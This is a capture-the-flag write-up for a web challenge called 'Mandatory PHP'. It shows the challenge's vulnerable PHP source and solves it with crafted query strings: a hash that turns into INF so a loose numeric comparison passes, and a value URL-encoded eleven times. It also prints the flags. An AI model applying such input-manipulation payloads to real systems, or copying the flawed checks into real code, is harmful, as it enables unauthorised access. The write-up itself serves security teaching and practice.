# Mandatory PHP
Web

## Challenge 

PHP, PHP everywhere get the flag and earn your points there.

http://159.89.166.12:14000/

## Solution

The code is shown on the website.

	<?php 
	include 'flag.php'; 
	highlight_file('index.php'); 
	$a = $_GET["val1"]; 
	$b = $_GET["val2"]; 
	$c = $_GET["val3"]; 
	$d = $_GET["val4"]; 
	if(preg_match('/[^A-Za-z]/', $a)) 
		die('oh my gawd...'); 
	$a=hash("sha256",$a); 
	$a=(log10($a**(0.5)))**2; 
	if($c>0&&$d>0&&$d>$c&&$a==$c*$c+$d*$d) 
	$s1="true"; 
	else 
	    die("Bye..."); 
	if($s1==="true") 
	    echo $flag1; 
	for($i=1;$i<=10;$i++){ 
	    if($b==urldecode($b)) 
	        die('duck'); 
	    else 
	        $b=urldecode($b); 
	}     
	if($b==="WoAHh!") 
	$s2="true"; 
	else 
	    die('oops..'); 
	if($s2==="true") 
	    echo $flag2; 
	die('end...'); 
	?> 

### Flag1

We need to meet the following conditions.
	
	// Condition 1
	if(preg_match('/[^A-Za-z]/', $a)) 
	
	// Condition 2
	$a=hash("sha256",$a); 
	$a=(log10($a**(0.5)))**2; 
	if($c>0 && $d>0 && $d>$c && $a == $c*$c + $d*$d) 

To make it simpler, I created a php script to test out.

	 $ php -f test.php 
	orig: hi
	hash: 8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4
	calc: 0.20389288115128
	
	 $ php -f test.php 
	orig: helloworld
	hash: 936a185caaa266bb9cbe981e9e05cb78cd732b0b3280eb944412bb6f8f8f07af
	calc: 2.2071200423236
	
	 $ php -f test.php 
	orig: testing
	hash: cf80cd8aed482d5d1527d7dc72fceff84e6326592848447d2dc0b0e87dfc9a90
	
	Warning: A non-numeric value encountered in /Users/manzelseet/Desktop/pragyanctf-2019/Mandatory_PHP/solve.php on line 9
	calc: INF

By pure chance, input string of 'testing' makes the variable `$a = INF`. This makes it easier to fulfil the condition as we merely need to make INF equate to INF.

Since d > c, let's enter `c` as `1` and `d` as `1e10000`.

Hence, when `$c*$c + $d*$d` is evaluated, it will be extremely large and become equal to `INF`.

When we visit this page, we get a partial flag 1.

	http://159.89.166.12:14000/?val1=testing&val3=1&val4=1e10000

	pctf{b3_c4r3fu1_duck

### Flag2

From the code, we see that $b is decoded 10 times, and it will result in "WoAHh!".

	for($i=1;$i<=10;$i++){ 
	    if($b==urldecode($b)) 
	        die('duck'); 
	    else 
	        $b=urldecode($b); 
	}
	if($b==="WoAHh!") 
		$s2="true"; 

Putting it in reverse into my PHP script, we get the payload

	$ php -f solve.php 
	============FLAG2============
	orig: WoAHh!
	encoded_10: WoAHh%25252525252525252521
	> success

Hence I expected to find the flag at this link. However, it didn't work.

	http://159.89.166.12:14000/?val1=testing&val3=1&val4=1e10000&val2=WoAHh%25252525252525252521

This is because the browser decodes my url once when I paste it into the URL box.

	$ php -f solve.php 
	============FLAG2============
	orig: WoAHh!
	encoded_11: WoAHh%2525252525252525252521

Encode it one more time and then get the flag

	http://159.89.166.12:14000/?val1=testing&val3=1&val4=1e10000&val2=WoAHh%2525252525252525252521

	pctf{b3_c4r3fu1_w1th_pHp_f31145}end...

## Flag

	pctf{b3_c4r3fu1_w1th_pHp_f31145}
